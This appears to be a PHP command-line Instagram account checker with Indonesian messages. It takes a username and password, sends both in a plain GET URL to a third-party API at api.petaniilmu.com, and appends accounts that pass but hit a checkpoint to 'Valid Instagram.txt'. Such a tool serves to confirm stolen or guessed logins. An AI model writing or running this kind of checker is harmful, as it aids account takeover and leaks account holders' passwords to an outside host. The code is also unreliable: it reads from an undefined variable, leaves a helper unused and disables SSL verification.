<?php
echo "\nUsername : ";
$u = trim(fgets(STDIN));

echo "\nPassword : ";
$p = trim(fgets(STDIN));
function curl($url, $var = null) {
      $curl = curl_init($url);
      curl_setopt($curl, CURLOPT_TIMEOUT, 25);
      if ($var != null) {
          curl_setopt($curl, CURLOPT_POST, true);
          curl_setopt($curl, CURLOPT_POSTFIELDS, $var);
      }
      curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
      curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
      curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
      $result = curl_exec($curl);
      curl_close($curl);
      return $result;
  }
$curl = file_get_contents("https://api.petaniilmu.com/api/api-cekinfoinstagram.php?username=".$u."&password=".$p);
$login = json_decode($curl);
if ($login->status == "ok"){
      if(empty($info->user->is_verified)){
        $verified = "No";
      }else{
        $verified = "Yes";
      }
      if(empty($info->user->is_business)){
        $business = "No";
      }else{
        $business = "Yes";
      }

      $idsystem404ID = $info->user->pk;
      $idsystem404Followers = $info->user->follower_count;
      $idsystem404Following = $info->user->following_count;
      $idsystem404Media = $info->user->media_count;
      
      echo "\n\e[1;33m$u\e[0m | \e[1;33m$p\e[0m : \e[0m[ \e[1;92mSUKSES LOGIN\e[0m ] [ \e[1;34mID : $idsystem404ID \e[0m| \e[1;34mFollowers : $idsystem404Followers \e[0m| \e[1;34mFollowing : $idsystem404Following \e[0m| \e[1;34mMedia : $idsystem404Media \e[0m]";

    }else{
      if($login->message == "checkpoint_required"){
              file_put_contents("Valid Instagram.txt", $u."|".$p." - Checkpoint \n", FILE_APPEND);

        echo "\n\e[1;33m$u\e[0m | \e[1;33m$p\e[0m : [ \e[1;92mSUKSES LOGIN\e[0m ] [ \e[1;31mCHECKPOINT\e[0m ]\n";
      }
      if($login->message == "The password you entered is incorrect. Please try again."){
        echo "\n\e[1;33m$u\e[0m | \e[1;33m$p\e[0m : \e[1;31mPassword yang Anda Masukkan Salah!\e[0m\n";
      }
      if($login->message == "The username you entered doesn't appear to belong to an account. Please check your username and try again."){
        echo "\n\e[1;33m$u\e[0m | \e[1;33m$p\e[0m : \e[1;31mUsername Tidak Terdaftar!\e[0m\n";
      }
    } 
?>